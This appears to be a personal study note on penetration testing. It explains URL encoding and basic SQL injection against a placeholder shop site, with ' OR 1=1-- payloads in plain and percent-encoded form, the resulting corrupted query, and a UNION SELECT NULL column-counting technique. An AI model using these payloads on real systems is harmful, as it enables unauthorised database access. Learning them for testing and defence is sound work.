---
title: Pen Testing 3 SQL, Burp
tags: tech
---

# Url search bar

Search bar will convert non-ascii characters to percents aka encoded UTF-8 encoded text  
`https://<url>?<query>

* <query>
  * white-space CAN be encoded to + OR percent hex representation
  * UTF-8 char encodes to percent hex representation 
<!--  -->
* Target: `https://insecure-website.com/products?category=Gifts`  
  * <query>: `?category=Gifts`
  * attack 1: `https://insecure-website.com/products?category=Gifts'+OR+1=1--`
  * attack 2: `https://insecure-website.com/products?category=Gifts%27%20OR%201%3D1%20--`

The `+` in attack 1 is translated into white space NOT the escaped `+` character.


```sql
-- Original 
SELECT * FROM products WHERE category = 'Gifts' AND released = 1

--Corrupted
SELECT * FROM products WHERE category = 'Gifts'' OR 1=1--AND released = 1
```

`--AND released = 1` gets commented out.  
The resulting query is equivalent to `SELECT * FROM products`  


## Finding number of cols

* `' UNION SELECT NULL,NULL--`
  * keep adding NULL , until query goes through, the number of NULL is the number of columns